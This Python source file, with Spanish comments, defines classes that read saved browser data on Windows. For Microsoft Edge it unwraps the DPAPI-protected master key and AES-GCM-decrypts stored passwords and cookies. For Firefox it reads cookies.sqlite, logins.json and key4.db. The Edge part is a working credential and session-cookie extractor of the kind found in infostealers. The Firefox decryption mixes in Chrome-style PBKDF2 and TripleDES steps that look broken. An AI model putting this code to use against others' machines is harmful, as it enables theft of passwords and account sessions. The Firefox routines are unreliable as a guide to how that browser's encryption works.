import base64
import json
import os
import sqlite3
import binascii
import win32crypt
from Crypto.Cipher import AES
from models.firefox import FirefoxCookie, FirefoxUsuarios
from models.edge import EdgeCookie, edge_usuario_contrasenia
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2


class CookieRepository_Firefox:
    def __init__(self):
        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "cookies.sqlite")
        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "key4.db")
        self.firefox_password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",
                                                'Profiles', "1knc2i2e.default-release", "logins.json")
    # Obtner las cookies de firefox
    def get_firefox_cookies(self):
        cookies = []
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            # Obtener todas las cookies de la base de datos
            cursor.execute(
                'SELECT originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly, isSecure FROM moz_cookies')

            # Iterar sobre todas las cookies
            for originAttributes, host, name, value, path, expiry, lastAccessed, isHttpOnly, isSecure in cursor.fetchall():
                # Intentar desencriptar el valor de la cookie
                try:
                    decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8')
                    path_value = win32crypt.CryptUnprotectData(path, None, None, None, 0)[1].decode('utf-8')
                except Exception:
                    # Si la desencriptación falla, usar el valor original
                    decrypted_value = value
                    path_value = path

                # Agregar la cookie a la lista de cookies
                cookies.append(
                    FirefoxCookie(originAttributes, host, name, decrypted_value, path_value, expiry, lastAccessed, isHttpOnly,
                                  isSecure))
                #cookies = Decryptor(self.firefox_db_path, self.firefox_key_path).decrypt()

        return cookies

    # Obtner las cookies de session de firefox
    def get_firefox_cookies_session(self):
        session_cookies = []
        rep = CookieRepository_Firefox()
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT originAttributes, name, value, path, host, expiry, lastAccessed, isHttpOnly, isSecure FROM moz_cookies WHERE isSecure = 1 ORDER BY expiry DESC')

            for originAttributes, name, value, path, host, expiry, lastAccessed, isHttpOnly, isSecure in cursor.fetchall():
                try:
                    #desencriptar el valor de la cookie win32crypt
                    decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode('utf-8')
                    path_value = win32crypt.CryptUnprotectData(path, None, None, None, 0)[1].decode('utf-8')
                except Exception:
                    # Si la desencriptación falla, usar el valor original
                    decrypted_value = value
                    path_value = path
                session_cookies.append(
                    FirefoxCookie(originAttributes, host, name, decrypted_value, path_value, expiry, lastAccessed, isHttpOnly,
                                  isSecure))

        return session_cookies

    # Count the session cookies of firefox
    def count_firefox_cookies_session(self):
        with sqlite3.connect(self.firefox_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT COUNT(*) FROM moz_cookies WHERE isSecure = 1')
            row = cursor.fetchone()
        return row[0] if row else 0

    def decrypt_firefox(self, encrypted_value):
        try:
            encryption_key, IV = self.get_encryption_key_and_iv()
            if encryption_key and IV:
                ciphertext = binascii.unhexlify(encrypted_value)
                cipher = Cipher(algorithms.TripleDES(encryption_key), modes.CBC(IV), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted_value = decryptor.update(ciphertext) + decryptor.finalize()
                decrypted_value = base64.b64encode(decrypted_value).decode('utf-8')
                return decrypted_value
        except Exception:
            return None

    # Desencriptar cookies de firefox
    def get_encryption_key_and_iv(self):
        conn = sqlite3.connect(self.firefox_key_path)
        cursor = conn.cursor()
        cursor.execute('SELECT item1, item2 FROM metaData WHERE id = ? ', ('password',))
        row = cursor.fetchone()
        if row:
            encryption_key_hex = row[0].strip("'")
            IV_hex = row[1].strip("'")
            encryption_key = binascii.unhexlify(encryption_key_hex)
            IV = binascii.unhexlify(IV_hex)
            return encryption_key, IV
        return None, None

    def obtener_contrasenias(self):
        contrasenias = []
        #llave = self.obtener_llave_session()
        with open(self.firefox_password_db_path, 'r') as file:
            data = json.load(file)
            for login in data['logins']:
                origin_url = login['hostname']
                action_url = login['formSubmitURL']
                username_value = login['encryptedUsername']
                password_value = login['encryptedPassword']
                #username_value =desecriptar_dato(username_value, llave)
                #password_value = desecriptar_dato(password_value, llave)
                date_created = login['timeCreated']
                date_last_used = login['timeLastUsed']
                if username_value or password_value:
                    aux = FirefoxUsuarios(origin_url, action_url, username_value, password_value, date_created, date_last_used)
                else:
                    continue
                contrasenias.append(aux)
        return contrasenias



    def obtener_llave_session(self):
        #obterner la llave de session de firefox de la base de datos key4.db
        conn = sqlite3.connect(self.firefox_key_path)
        cursor = conn.cursor()
        cursor.execute('SELECT item1 FROM metaData WHERE id = ? ', ('password',))
        row = cursor.fetchone()
        #utilizar PBKDF2 para desencriptar la llave
        if row:
            key = row[0].hex()
            key = base64.b64decode(key)
            salt = b'saltysalt'
            iv = b' ' * 16
            length = 16
            backend = default_backend()
            key = PBKDF2(key, salt, length, 100, backend)
            return key

        return None


class CookieRepository_Edge:
    def __init__(self):
        self.edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default",'Network', "Cookies")
        self.edge_db_user_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",'Default', "Login Data")
        self.directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Microsoft", "Edge", "User Data", "Local State")
    # Obtner las cookies de session de edge
    def get_edge_cookies(self):
        cookies = []
        llave = obtener_llave_session(self.directorio_llaves_edge)
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies')
            for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
                try:

                    encrypted_value = desecriptar_dato(encrypted_value, llave)

                    cookies.append(EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
                                   is_secure,
                                   is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite,
                                   source_port, encrypted_value))
                except Exception as e:
                    print(f"Error desencriptando cookie: {e}")
        return cookies


    # Obtner las cookies de session de edge
    def get_edge_cookies_session(self):
        session_cookies = []
        llave = obtener_llave_session(self.directorio_llaves_edge)
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies WHERE is_secure = 1 ORDER BY expires_utc DESC')
            for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
                try:
                    encrypted_value = desecriptar_dato(encrypted_value, llave)

                    session_cookies.append(
                        EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
                                   is_secure,
                                   is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite,
                                   source_port, encrypted_value))
                except Exception as e:
                    print(f"Error desencriptando cookie: {e}")

        return session_cookies

    # Contar las cookies de session de edge
    def count_edge_cookies_session(self):
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT COUNT(*) FROM cookies WHERE is_secure = 1')
            row = cursor.fetchone()
        return row[0] if row else 0

    def numeros_paginas_encontradas_sin_repetir(self):
        #obtener el numero de paginas encontradas sin repetir y su  url
        listaPaginasYcantidadPaginas = []
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC')
            for url, cantidad in cursor.fetchall():
                listaPaginasYcantidadPaginas.append((url, cantidad))
        return listaPaginasYcantidadPaginas


    def top_ten_paginas_encontradas_sin_repetir(self):
        #obtener el top 10 de paginas encontradas sin repetir
        listaPaginasYcantidadPaginas = []
        with sqlite3.connect(self.edge_db_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'SELECT host_key, COUNT(host_key) FROM cookies GROUP BY host_key ORDER BY COUNT(host_key) DESC LIMIT 10')
            for url, cantidad in cursor.fetchall():
                listaPaginasYcantidadPaginas.append((url, cantidad))
        return listaPaginasYcantidadPaginas


    def obtener_contrasenias(self):
        llave = obtener_llave_session(self.directorio_llaves_edge)
        contrasenias = []
        with sqlite3.connect(self.edge_db_user_path) as conn:
            cursor = conn.cursor()
            cursor.execute(
                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created desc')
            for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.fetchall():
                password = desecriptar_dato(password_value, llave)
                if username_value or password:
                    aux = edge_usuario_contrasenia(origin_url, action_url, username_value, password, date_created,
                                                   date_last_used)
                else:
                    continue
                contrasenias.append(aux)
        cursor.close()
        conn.close()
        return contrasenias

    def numero_contrasenias_encontradas(self):
        #obtener el numero de contrasenias encontradas y no encontradas
        contrasenias = []
        with sqlite3.connect(self.edge_db_user_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM logins WHERE password_value IS NOT NULL')
            row = cursor.fetchone()
            contrasenias.append(row[0])
        return contrasenias

def obtener_llave_session(directorio_llaves):
    # Leer el archivo key
    with open(directorio_llaves, 'r', encoding='utf-8') as file:
        file2 = file.read()  # Leer el archivo
        # Guardar en json el archivo
        file2 = json.loads(file2)

    key = base64.b64decode(file2['os_crypt']['encrypted_key'])  # Decodificar la clave en base64 a bytes
    key = key[5:]  # Eliminar el prefijo 'DPAPI' si existe
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def desecriptar_dato(data ,llave):
    try:
        iv = data[3:15]
        data = data[15:]
        cifrar = AES.new(llave, AES.MODE_GCM,iv)
        return cifrar.decrypt(data)[:-16].decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except Exception:
            return ""


